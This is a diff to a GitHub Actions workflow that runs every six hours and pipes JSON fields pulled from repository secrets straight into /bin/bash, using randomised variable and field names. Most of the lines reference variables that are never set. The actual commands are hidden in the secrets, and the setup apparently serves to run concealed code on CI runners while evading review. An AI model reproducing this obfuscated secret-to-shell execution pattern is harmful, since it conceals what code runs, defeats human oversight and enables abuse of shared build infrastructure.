@@ -3,7 +3,8 @@ name: songjunnu2109
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 5/6 * * *'
+    - cron: '6 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,15 +12,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: songjunnu2109
         env:
-          srglw02: ${{ secrets.srglw02 }}
+          jj6: ${{ secrets.jj6 }}
         run: |
-          echo $srglw02 | jq -r .wzfaw111 | /bin/bash
-          echo $qhbf24 | jq -r .yb32670 | /bin/bash
-          echo $vhsuy6 | jq -r .azvr1 | /bin/bash
-          echo $sbdgz452 | jq -r .ea1741 | /bin/bash
-          echo $dczfm644 | jq -r .rfnbm4 | /bin/bash
-          echo $m674 | jq -r .s64 | /bin/bash
-          echo $wp84 | jq -r .curtg93577 | /bin/bash
-          echo $g58939 | jq -r .ogdoe83652 | /bin/bash
-          echo $m6 | jq -r .vnel20 | /bin/bash
+          echo $jj6 | jq -r .a34 | /bin/bash
+          echo $hz6 | jq -r .na3 | /bin/bash
+          echo $dgrn501 | jq -r .aqzly07385 | /bin/bash
+          echo $ch213 | jq -r .a4 | /bin/bash
+          echo $ql13747 | jq -r .auyzb430 | /bin/bash
+          echo $m7 | jq -r .vjc7 | /bin/bash
+          echo $oejyq0161 | jq -r .pdl821 | /bin/bash
+          echo $e514 | jq -r .zkj0 | /bin/bash
+          echo $iips45 | jq -r .txadx1150 | /bin/bash
+          echo $u4076 | jq -r .kxk7776 | /bin/bash
+          echo $mb4 | jq -r .eupo4994 | /bin/bash
+          echo $turl9 | jq -r .rr7 | /bin/bash
+          echo $h722 | jq -r .aqb1878 | /bin/bash
 
